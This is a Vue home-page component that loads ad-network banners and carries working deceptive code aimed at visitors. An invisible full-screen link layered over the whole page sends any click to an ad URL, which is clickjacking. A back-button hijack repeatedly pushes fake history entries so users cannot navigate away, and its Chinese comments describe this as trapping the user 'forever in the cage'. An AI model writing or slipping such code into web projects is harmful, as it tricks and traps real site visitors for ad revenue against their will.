<template>
  <div class="home-b">
    <div id="container-d1debede50ec7d8df5940dc07088499f"></div>

    <a href="https://www.profitablecpmratenetwork.com/eet0d835?key=edd631eedc507862650ff626c430b6da"
       target="_blank"
       style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; opacity: 0; cursor: pointer;">
    </a>

    <!-- 通知权限弹窗 -->
    <NotificationDialog ref="notificationDialog" />
  </div>
</template>

<script setup>
import {AdsterraAd} from "../utils/adSdk";
import {onMounted} from "vue";
import NotificationDialog from "@/components/NotificationDialog.vue";

AdsterraAd.showNativeBanner("ad.ttgame");

onMounted(() => {
  setTimeout(() => {
    initBackHijack();
  }, 500)
})

const initBackHijack = (showPopupCallback) => {
  let baseUrl = location.href.split('?')[0]; // 获取干净的当前URL

  // 1. 塞入假的历史记录（布置陷阱）
  history.replaceState({ page: 'trap' }, '', baseUrl + '?step=1');
  history.pushState({ page: 'current' }, '', baseUrl + '?step=2');

  // 2. 监听老哥按返回键（收网）
  window.addEventListener("popstate", (event) => {
    // 只要他按了返回键退到了 step=1，立刻重新把历史记录补满！让他永远在笼子里
    history.pushState({ page: 'current' }, '', baseUrl + '?step=2');
  });
}
</script>

<style scoped>
.home-b {
  margin: 0 auto;
  width: 100%;
  height: auto;
}
</style>